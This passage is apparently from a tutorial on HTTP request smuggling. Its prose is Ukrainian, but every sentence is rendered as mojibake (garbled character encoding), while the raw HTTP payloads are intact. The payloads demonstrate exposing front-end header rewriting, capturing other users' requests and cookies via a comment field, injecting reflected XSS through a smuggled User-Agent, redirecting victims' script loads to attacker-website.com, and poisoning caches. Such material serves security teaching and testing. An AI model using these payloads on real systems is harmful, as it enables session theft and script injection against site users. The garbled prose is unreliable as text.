–ø—ñ–¥—Å—Ç–∞–≤–Ω–∏–π –∑–∞–ø–∏—Ç `GET /admin`, –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –Ω–∞–¥–∞—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–º–µ–∂–µ–Ω–æ–≥–æ —à–ª—è—Ö—É `/admin`.

### –†–æ–∑–∫—Ä–∏—Ç—Ç—è –ø–µ—Ä–µ–ø–∏—Å—É–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—É —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

–î–æ–¥–∞—Ç–∫–∏ —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å **—Å–µ—Ä–≤–µ—Ä —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É**, —â–æ–± –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤—Ö—ñ–¥–Ω—ñ –∑–∞–ø–∏—Ç–∏ –ø–µ—Ä–µ–¥ —ó—Ö –ø–µ—Ä–µ–¥–∞—á–µ—é –Ω–∞ —Å–µ—Ä–≤–µ—Ä –±–µ–∫–µ–Ω–¥—É. –¢–∏–ø–æ–≤–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –≤–∫–ª—é—á–∞—î –¥–æ–¥–∞–≤–∞–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ `X-Forwarded-For: <IP –∫–ª—ñ—î–Ω—Ç–∞>`, –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ IP –∫–ª—ñ—î–Ω—Ç–∞ –Ω–∞ –±–µ–∫–µ–Ω–¥. –†–æ–∑—É–º—ñ–Ω–Ω—è —Ü–∏—Ö –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ–π –º–æ–∂–µ –±—É—Ç–∏ –∫—Ä–∏—Ç–∏—á–Ω–∏–º, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –º–æ–∂–µ —Ä–æ–∑–∫—Ä–∏—Ç–∏ —Å–ø–æ—Å–æ–±–∏ **–æ–±—Ö—ñ–¥ –∑–∞—Ö–∏—Å—Ç—É** –∞–±–æ **–≤–∏—è–≤–ª–µ–Ω–Ω—è –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∞–±–æ –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫**.

–©–æ–± –¥–æ—Å–ª—ñ–¥–∏—Ç–∏, —è–∫ –ø—Ä–æ–∫—Å—ñ –∑–º—ñ–Ω—é—î –∑–∞–ø–∏—Ç, –∑–Ω–∞–π–¥—ñ—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä POST, —è–∫–∏–π –±–µ–∫–µ–Ω–¥ –ø–æ–≤–µ—Ä—Ç–∞—î —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –ü–æ—Ç—ñ–º —Å—Ç–≤–æ—Ä—ñ—Ç—å –∑–∞–ø–∏—Ç, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ–π –ø–∞—Ä–∞–º–µ—Ç—Ä –æ—Å—Ç–∞–Ω–Ω—ñ–º, –ø–æ–¥—ñ–±–Ω–æ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
–£ —Ü—ñ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ñ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ –∑–∞–ø–∏—Ç—É –¥–æ–¥–∞—é—Ç—å—Å—è –ø—ñ—Å–ª—è `search=`, —è–∫–∏–π —î –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º, –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∏–º —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –¶–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Ä–æ–∑–∫—Ä–∏—î –∑–∞–≥–æ–ª–æ–≤–∫–∏ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É.

–í–∞–∂–ª–∏–≤–æ –≤–∏—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Content-Length` –≤–∫–ª–∞–¥–µ–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –∑ —Ñ–∞–∫—Ç–∏—á–Ω–æ—é –¥–æ–≤–∂–∏–Ω–æ—é –≤–º—ñ—Å—Ç—É. –†–æ–∑–ø–æ—á–∞—Ç–∏ –∑ –Ω–µ–≤–µ–ª–∏–∫–æ–≥–æ –∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∞ –ø–æ—Å—Ç—É–ø–æ–≤–æ –∑–±—ñ–ª—å—à—É–≤–∞—Ç–∏ —î —Ä–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–æ, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–∞–Ω–∞–¥—Ç–æ –Ω–∏–∑—å–∫–µ –∑–Ω–∞—á–µ–Ω–Ω—è –æ–±—Ä—ñ–∂–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω—ñ –¥–∞–Ω—ñ, —Ç–æ–¥—ñ —è–∫ –∑–∞–Ω–∞–¥—Ç–æ –≤–µ–ª–∏–∫–µ –∑–Ω–∞—á–µ–Ω–Ω—è –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø–æ–º–∏–ª–∫–∏ –∑–∞–ø–∏—Ç—É.

–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ —Ç–∞–∫–æ–∂ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ TE.CL, –∞–ª–µ –∑–∞–ø–∏—Ç –ø–æ–≤–∏–Ω–µ–Ω –∑–∞–≤–µ—Ä—à—É–≤–∞—Ç–∏—Å—è `search=\r\n0`. –ù–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Å–∏–º–≤–æ–ª—ñ–≤ –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞, –∑–Ω–∞—á–µ–Ω–Ω—è –±—É–¥—É—Ç—å –¥–æ–¥–∞–≤–∞—Ç–∏—Å—è –¥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –ø–æ—à—É–∫—É.

–¶–µ–π –º–µ—Ç–æ–¥ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É —Å–ª—É–∂–∏—Ç—å –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ–π –∑–∞–ø–∏—Ç—É, –∑—Ä–æ–±–ª–µ–Ω–∏—Ö –ø—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä–æ–º —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –≤–∏–∫–æ–Ω—É—é—á–∏ —Å–∞–º–æ—Å—Ç—ñ–π–Ω–µ —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è.

### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

–ú–æ–∂–ª–∏–≤–æ –∑–∞—Ö–æ–ø–∏—Ç–∏ –∑–∞–ø–∏—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –¥–æ–¥–∞—é—á–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –∑–∞–ø–∏—Ç —è–∫ –∑–Ω–∞—á–µ–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –ø—ñ–¥ —á–∞—Å –æ–ø–µ—Ä–∞—Ü—ñ—ó POST. –û—Å—å —è–∫ —Ü–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏:

–î–æ–¥–∞–≤—à–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç —è–∫ –∑–Ω–∞—á–µ–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–±–µ—Ä–µ–≥—Ç–∏ –∑–∞–ø–∏—Ç –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
–£ —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó **–ø–∞—Ä–∞–º–µ—Ç—Ä –∫–æ–º–µ–Ω—Ç–∞—Ä—è** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É —É —Ä–æ–∑–¥—ñ–ª—ñ –∫–æ–º–µ–Ω—Ç–∞—Ä—ñ–≤ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏. –í—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ, –≤–º—ñ—Å—Ç –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –±—É–¥–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏—Å—è —è–∫ –∫–æ–º–µ–Ω—Ç–∞—Ä.

–ü—Ä–æ—Ç–µ —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –º–∞—î –æ–±–º–µ–∂–µ–Ω–Ω—è. –ó–∞–∑–≤–∏—á–∞–π –≤–æ–Ω–∞ –∑–∞—Ö–æ–ø–ª—é—î –¥–∞–Ω—ñ –ª–∏—à–µ –¥–æ —Ä–æ–∑–¥—ñ–ª—å–Ω–∏–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ–≥–æ –≤ –ø—ñ–¥—Ç–∞—Å–æ–≤–∞–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ. –î–ª—è URL-–∫–æ–¥–æ–≤–∞–Ω–∏—Ö –≤—ñ–¥–ø—Ä–∞–≤–æ–∫ —Ñ–æ—Ä–º–∏ —Ü–∏–º —Ä–æ–∑–¥—ñ–ª—å–Ω–∏–∫–æ–º —î —Å–∏–º–≤–æ–ª `&`. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–∞—Ö–æ–ø–ª–µ–Ω–∏–π –≤–º—ñ—Å—Ç –∑ –∑–∞–ø–∏—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞-–∂–µ—Ä—Ç–≤–∏ –∑—É–ø–∏–Ω–∏—Ç—å—Å—è –Ω–∞ –ø–µ—Ä—à–æ–º—É `&`, —è–∫–∏–π –º–æ–∂–µ –Ω–∞–≤—ñ—Ç—å –±—É—Ç–∏ —á–∞—Å—Ç–∏–Ω–æ—é —Ä—è–¥–∫–∞ –∑–∞–ø–∏—Ç—É.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –≤–∞—Ä—Ç–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ —Ü–µ–π –ø—ñ–¥—Ö—ñ–¥ —Ç–∞–∫–æ–∂ —î –∂–∏—Ç—Ç—î–∑–¥–∞—Ç–Ω–∏–º —É –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ TE.CL. –£ —Ç–∞–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –∑–∞–ø–∏—Ç –ø–æ–≤–∏–Ω–µ–Ω –∑–∞–≤–µ—Ä—à—É–≤–∞—Ç–∏—Å—è `search=\r\n0`. –ù–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Å–∏–º–≤–æ–ª—ñ–≤ –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞, –∑–Ω–∞—á–µ–Ω–Ω—è –±—É–¥—É—Ç—å –¥–æ–¥–∞–Ω—ñ –¥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –ø–æ—à—É–∫—É.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è HTTP-–ø—ñ–¥—Ç–∞—Å–æ–≤—É–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–æ–≥–æ XSS

HTTP-–ø—ñ–¥—Ç–∞—Å–æ–≤—É–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–µ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫, —è–∫—ñ –≤—Ä–∞–∑–ª–∏–≤—ñ –Ω–∞ **–í—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∏–π XSS**, –ø—Ä–æ–ø–æ–Ω—É—é—á–∏ –∑–Ω–∞—á–Ω—ñ –ø–µ—Ä–µ–≤–∞–≥–∏:

* –í–∑–∞—î–º–æ–¥—ñ—è –∑ —Ü—ñ–ª—å–æ–≤–∏–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ **–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–∞**.
* –î–æ–∑–≤–æ–ª—è—î –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é XSS –≤ —á–∞—Å—Ç–∏–Ω–∞—Ö –∑–∞–ø–∏—Ç—É, —è–∫—ñ **–∑–∞–∑–≤–∏—á–∞–π –Ω–µ–¥–æ—Å—è–∂–Ω—ñ**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞–≥–æ–ª–æ–≤–∫–∏ HTTP-–∑–∞–ø–∏—Ç—ñ–≤.

–£ —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, –¥–µ –≤–µ–±-—Å–∞–π—Ç –≤—Ä–∞–∑–ª–∏–≤–∏–π –Ω–∞ –í—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∏–π XSS —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–æ–∫ User-Agent, –Ω–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î, —è–∫ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
–¶–µ–π –ø–æ–ª–µ–∑–Ω–∏–π –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–≤–∞–Ω–∏–π –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —à–ª—è—Ö–æ–º:

1. –Ü–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—É `POST`, —è–∫–∏–π, –Ω–∞ –ø–µ—Ä—à–∏–π –ø–æ–≥–ª—è–¥, —î —Ç–∏–ø–æ–≤–∏–º, –∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–º `Transfer-Encoding: chunked`, —â–æ–± –ø–æ–∑–Ω–∞—á–∏—Ç–∏ –ø–æ—á–∞—Ç–æ–∫ –ø—ñ–¥–º—ñ—Ç–∞–Ω–Ω—è.
2. –ü–æ–¥–∞–ª—å—à–µ –≤–≤–µ–¥–µ–Ω–Ω—è `0`, –ø–æ–∑–Ω–∞—á–∞—é—á–∏ –∫—ñ–Ω–µ—Ü—å —Ç—ñ–ª–∞ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —É –≤–∏–≥–ª—è–¥—ñ —á–∞—Å—Ç–∏–Ω.
3. –ü–æ—Ç—ñ–º –≤–≤–æ–¥–∏—Ç—å—Å—è –ø—ñ–¥–º—ñ—Ç–µ–Ω–∏–π –∑–∞–ø–∏—Ç `GET`, –¥–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `User-Agent` –≤–ø—Ä–æ–≤–∞–¥–∂—É—î—Ç—å—Å—è –∑—ñ —Å–∫—Ä–∏–ø—Ç–æ–º, `<script>alert(1)</script>`, —â–æ —Å–ø—Ä–∏—á–∏–Ω—è—î –≤–∏–∫–ª–∏–∫ XSS, –∫–æ–ª–∏ —Å–µ—Ä–≤–µ—Ä –æ–±—Ä–æ–±–ª—è—î —Ü–µ–π –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç.

–®–ª—è—Ö–æ–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è `User-Agent` —á–µ—Ä–µ–∑ –ø—ñ–¥–º—ñ—Ç–∞–Ω–Ω—è, —Ü–µ–π –ø–æ–ª–µ–∑–Ω–∏–π –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –æ–±—Ö–æ–¥–∏—Ç—å –∑–≤–∏—á–∞–π–Ω—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è –∑–∞–ø–∏—Ç—É, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å Reflected XSS —É –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π, –∞–ª–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–π —Å–ø–æ—Å—ñ–±.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—å –∑ HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

–î–æ–¥–∞—Ç–∫–∏ —á–∞—Å—Ç–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—å –∑ –æ–¥–Ω–æ–≥–æ URL –Ω–∞ —ñ–Ω—à–∏–π, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–º'—è —Ö–æ—Å—Ç–∞ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Host` –≤ URL –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è. –¶–µ —Ç–∏–ø–æ–≤–æ –¥–ª—è –≤–µ–±-—Å–µ—Ä–≤–µ—Ä—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ Apache —Ç–∞ IIS. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞–ø–∏—Ç –Ω–∞ –ø–∞–ø–∫—É –±–µ–∑ –∫–æ—Å–æ—ó —Ä–∏—Å–∫–∏ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∑ –≤–∫–ª—é—á–µ–Ω–Ω—è–º –∫–æ—Å–æ—ó —Ä–∏—Å–∫–∏:
```
GET /home HTTP/1.1
Host: normal-website.com
```
–†–µ–∑—É–ª—å—Ç–∞—Ç–∏:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
–•–æ—á–∞ –Ω–∞ –ø–µ—Ä—à–∏–π –ø–æ–≥–ª—è–¥ —Ü—è –ø–æ–≤–µ–¥—ñ–Ω–∫–∞ –º–æ–∂–µ –∑–¥–∞—Ç–∏—Å—è –±–µ–∑–ø–µ—á–Ω–æ—é, —ó—ó –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é HTTP-–∑–∞–ø–ª—É—Ç—É–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –Ω–∞ –∑–æ–≤–Ω—ñ—à–Ω—ñ–π —Å–∞–π—Ç. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
–¶–µ–π –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥–Ω–∏–π –∑–∞–ø–∏—Ç –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Ç–æ–≥–æ, —â–æ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –æ–±—Ä–æ–±–ª–µ–Ω–∏–π –∑–∞–ø–∏—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±—É–¥–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–π –Ω–∞ –≤–µ–±-—Å–∞–π—Ç, –∫–æ—Ç—Ä–∏–º –∫–µ—Ä—É—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
–†–µ–∑—É–ª—å—Ç–∞—Ç–∏:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
–£ —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó –∑–∞–ø–∏—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–∞ —Ñ–∞–π–ª JavaScript –±—É–≤ –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–∏–π. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –ø–æ–¥–∞—é—á–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–π JavaScript —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –û—Ç—Ä—É—î–Ω–Ω—è –ö–µ—à—É –í–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏ —á–µ—Ä–µ–∑ HTTP –ó–∞–ø–∏—Ç–∏ –ü–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

–û—Ç—Ä—É—î–Ω–Ω—è –∫–µ—à—É –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–µ, —è–∫—â–æ –±—É–¥—å-—è–∫–∞ —Å–∫–ª–∞–¥–æ–≤–∞ **—ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∏ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É –∫–µ—à—É—î –≤–º—ñ—Å—Ç**, –∑–∞–∑–≤–∏—á–∞–π –¥–ª—è –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è –ø—Ä–æ–¥—É–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ. –®–ª—è—Ö–æ–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥–¥—é —Å–µ—Ä–≤–µ—Ä–∞ –º–æ–∂–ª–∏–≤–æ **–æ—Ç—Ä—É—ó—Ç–∏ –∫–µ—à**.

–†–∞–Ω—ñ—à–µ –º–∏ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–ª–∏, —è–∫ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω—ñ –¥–ª—è –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –ø–æ–º–∏–ª–∫–∏ 404 (–¥–∏–≤. [–ë–∞–∑–æ–≤—ñ –ü—Ä–∏–∫–ª–∞–¥–∏](./#basic-examples)). –ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, –º–æ–∂–ª–∏–≤–æ –æ–±–º–∞–Ω—É—Ç–∏ —Å–µ—Ä–≤–µ—Ä, —â–æ–± –≤—ñ–Ω –¥–æ—Å—Ç–∞–≤–∏–≤ –≤–º—ñ—Å—Ç `/index.html` —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –∑–∞–ø–∏—Ç `/static/include.js`. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ –≤–º—ñ—Å—Ç `/static/include.js` –∑–∞–º—ñ–Ω—é—î—Ç—å—Å—è –≤ –∫–µ—à—ñ –Ω–∞ –≤–º—ñ—Å—Ç `/index.html`, —â–æ —Ä–æ–±–∏—Ç—å `/static/include.js` –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –í—ñ–¥–º–æ–≤–∏ –≤ –û–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ (DoS).

